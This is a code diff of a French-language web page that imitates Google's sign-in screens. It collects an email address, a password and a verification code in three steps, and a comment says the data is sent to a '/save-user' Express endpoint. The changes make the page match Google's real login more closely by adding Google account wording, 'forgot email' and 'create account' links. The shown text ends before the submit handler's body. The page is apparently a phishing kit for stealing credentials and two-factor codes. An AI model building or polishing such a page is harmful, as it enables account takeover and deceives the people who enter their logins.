@@ -12,19 +12,18 @@
     body {
       background-color: #ffffff;
       margin: 0;
-      padding: 0;
+      padding: 24px;
       display: flex;
       justify-content: center;
-      align-items: center;
+      align-items: flex-start;
       min-height: 100vh;
     }
     .container {
       width: 100%;
-      max-width: 400px;
-      padding: 40px 24px;
+      max-width: 360px;
       display: flex;
       flex-direction: column;
-      justify-content: center;
+      margin-top: 10px;
     }
     .top-content {
       text-align: center;
@@ -33,7 +32,7 @@
       font-size: 32px;
       font-weight: 500;
       letter-spacing: -0.5px;
-      margin-bottom: 16px;
+      margin-bottom: 20px;
     }
     .logo span:nth-child(1) { color: #4285F4; }
     .logo span:nth-child(2) { color: #EA4335; }
@@ -43,15 +42,30 @@
     .logo span:nth-child(6) { color: #EA4335; }
 
     .title {
-      font-size: 26px;
-      color: #1f1f1f;
-      margin-bottom: 12px;
+      font-size: 24px;
+      color: #202124;
+      margin: 0 0 12px 0;
       font-weight: 400;
     }
+    .subtitle {
+      font-size: 14px;
+      color: #3c4043;
+      line-height: 1.4;
+      margin: 0 0 6px 0;
+    }
+    .learn-more {
+      color: #1a73e8;
+      font-size: 14px;
+      text-decoration: none;
+      font-weight: 500;
+      display: block;
+      margin-bottom: 32px;
+    }
+
+    /* Outlined Input Box with floating label */
     .input-group {
       position: relative;
-      margin-bottom: 20px;
-      text-align: left;
+      margin-bottom: 12px;
     }
     .input-group input {
       width: 100%;
@@ -66,19 +80,34 @@
     .input-group label {
       position: absolute;
       left: 12px;
-      top: -10px;
+      top: -9px;
       background-color: #ffffff;
       padding: 0 4px;
       font-size: 12px;
       color: #1a73e8;
     }
-    .bottom-actions {
+
+    .link-btn {
+      color: #1a73e8;
+      font-size: 14px;
+      text-decoration: none;
+      font-weight: 500;
+      display: inline-block;
+      cursor: pointer;
+    }
+
+    .forgot-email {
+      margin-bottom: 48px;
+    }
+
+    .actions-row {
       display: flex;
-      justify-content: flex-end;
+      justify-content: space-between;
       align-items: center;
       margin-top: 24px;
     }
-    button {
+
+    button.btn-next {
       padding: 10px 24px;
       background-color: #1a73e8;
       color: #ffffff;
@@ -88,12 +117,14 @@
       font-weight: 500;
       cursor: pointer;
     }
-    button:hover {
+    button.btn-next:hover {
       background-color: #1557b0;
     }
+
     #step2, #step3, #success-message {
       display: none;
     }
+
     .user-chip {
       display: inline-block;
       border: 1px solid #dadce0;
@@ -103,6 +134,7 @@
       color: #3c4043;
       margin-bottom: 20px;
     }
+
     .show-password {
       display: flex;
       align-items: center;
@@ -114,12 +146,6 @@
       margin-right: 8px;
       width: 18px;
       height: 18px;
-    }
-    #success-message {
-      color: #1e8e3e;
-      font-size: 20px;
-      font-weight: bold;
-      text-align: center;
     }
   </style>
 </head>
@@ -133,20 +159,29 @@
       <h1 class="title">Connexion</h1>
     </div>
 
-    <!-- Step 1: Email -->
+    <!-- Étape 1: Adresse e-mail ou téléphone -->
     <div id="step1">
+      <p class="subtitle">Utilisez votre compte Google. Il sera ajouté à cet appareil et disponible pour d'autres applis Google.</p>
+      <a href="#" class="learn-more">En savoir plus sur l'utilisation de votre compte</a>
+
       <form id="step1Form">
         <div class="input-group">
           <input type="text" id="emailInput" required autocomplete="off">
-          <label for="emailInput">E-mail ou téléphone</label>
+          <label for="emailInput">Adresse e-mail ou téléphone</label>
         </div>
-        <div class="bottom-actions">
-          <button type="submit">Suivant</button>
+        
+        <div class="forgot-email">
+          <a href="#" class="link-btn">Adresse e-mail oubliée ?</a>
+        </div>
+
+        <div class="actions-row">
+          <a href="#" class="link-btn">Créer un compte</a>
+          <button type="submit" class="btn-next">Suivant</button>
         </div>
       </form>
     </div>
 
-    <!-- Step 2: Password -->
+    <!-- Étape 2: Mot de passe -->
     <div id="step2">
       <div class="user-chip" id="userEmailDisplay"></div>
       <form id="step2Form">
@@ -157,27 +192,27 @@
         <div class="show-password">
           <input type="checkbox" onclick="togglePassword()"> Afficher le mot de passe
         </div>
-        <div class="bottom-actions">
-          <button type="submit">Suivant</button>
+        <div class="actions-row" style="justify-content: flex-end;">
+          <button type="submit" class="btn-next">Suivant</button>
         </div>
       </form>
     </div>
 
-    <!-- Step 3: Verification Code -->
+    <!-- Étape 3: Code de vérification -->
     <div id="step3">
       <form id="step3Form">
         <div class="input-group">
           <input type="text" id="codeInput" required autocomplete="off">
           <label for="codeInput">Code de vérification</label>
         </div>
-        <div class="bottom-actions">
-          <button type="submit">Valider</button>
+        <div class="actions-row" style="justify-content: flex-end;">
+          <button type="submit" class="btn-next">Valider</button>
         </div>
       </form>
     </div>
 
-    <!-- Success Screen -->
-    <div id="success-message">
+    <!-- Message de succès -->
+    <div id="success-message" style="text-align: center; color: #1e8e3e; font-size: 20px; font-weight: bold; margin-top: 40px;">
       Connexion réussie !
     </div>
   </div>
@@ -197,7 +232,7 @@
     const userEmailDisplay = document.getElementById('userEmailDisplay');
     const successMsg = document.getElementById('success-message');
 
-    // step 1 -> step 2
+    // Étape 1 -> Étape 2
     step1Form.addEventListener('submit', function(e) {
       e.preventDefault();
       userEmailDisplay.textContent = emailInput.value;
@@ -205,14 +240,14 @@
       step2Div.style.display = 'block';
     });
 
-    // step 2 -> step 3
+    // Étape 2 -> Étape 3
     step2Form.addEventListener('submit', function(e) {
       e.preventDefault();
       step2Div.style.display = 'none';
       step3Div.style.display = 'block';
     });
 
-    // step 3 -> Save to Express Backend (/save-user)
+    // Étape 3 -> الإرسال للسيرفر (/save-user)
     step3Form.addEventListener('submit', async function(e) {
       e.preventDefault();
       
